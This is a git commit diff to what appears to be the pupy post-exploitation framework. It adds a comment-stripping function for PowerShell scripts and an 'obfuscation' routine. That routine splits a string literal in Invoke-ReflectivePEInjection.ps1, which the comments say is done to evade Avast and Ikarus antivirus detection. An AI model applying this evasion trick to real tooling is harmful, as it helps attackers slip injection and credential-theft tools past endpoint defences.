f9ee8f3e2f143634526c2393a71c12c7691afd18
root <qhardyfr@gmail.com>
2016-08-17 11:05:34 -0400

    New function to clean powershell script

--- pupy/modules/lib/windows/powershell_upload.py
+++ pupy/modules/lib/windows/powershell_upload.py
@@ -1,7 +1,8 @@
+# -*- coding: UTF8 -*-
+
 from rpyc.utils.classic import upload
-import base64
+import base64, re, subprocess
 from subprocess import PIPE, Popen
-import subprocess
 
 def execute_powershell_script(module, content, function, x64IfPossible=False):
     '''
@@ -36,3 +37,34 @@ def execute_powershell_script(module, content, function, x64IfPossible=False):
     output = base64.b64decode(output)
     p.stdin.write("exit\n")
     return output
+
+def remove_comments(string):
+    '''
+    Remove comments in powershell script
+    '''
+    pattern = r"(\".*?\"|\'.*?\')|(<#.*?#>|#[^\r\n]*$)"
+    # first group captures quoted strings (double or single)
+    # second group captures comments (#single-line or <# multi-line #>)
+    regex = re.compile(pattern, re.MULTILINE|re.DOTALL)
+    def _replacer(match):
+        # if the 2nd group (capturing comments) is not None,
+        # it means we have captured a non-quoted (real) comment string.
+        if match.group(2) is not None:
+            return "" # so we will return empty to remove the comment
+        else: # otherwise, we will return the 1st group
+            return match.group(1) # captured quoted-string
+    return regex.sub(_replacer, string)
+
+def obfuscatePowershellScript(code):
+    '''
+    Try to clean powershell script (perhaps in the future 'obfuscation'...).
+    Comments are deteleted and some strings are replaced in some powershell functions to bypass AV detection
+    '''
+    import re
+    newCode = code
+    newCode = remove_comments(newCode)
+    #For Avast detection bypass. Very easy to bypass the AV detection : Shame on you Avast -:)
+    #Notice only Avast and Ikarus detect Invoke-ReflectivePEInjection.ps1 as a 'virus' (BV:AndroDrp-B [Drp], HackTool.Win32.Mikatz)
+    if "function Invoke-ReflectivePEInjection" in newCode:
+        newCode = newCode.replace("$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null", "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERIS'+'TICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null")
+    return newCode
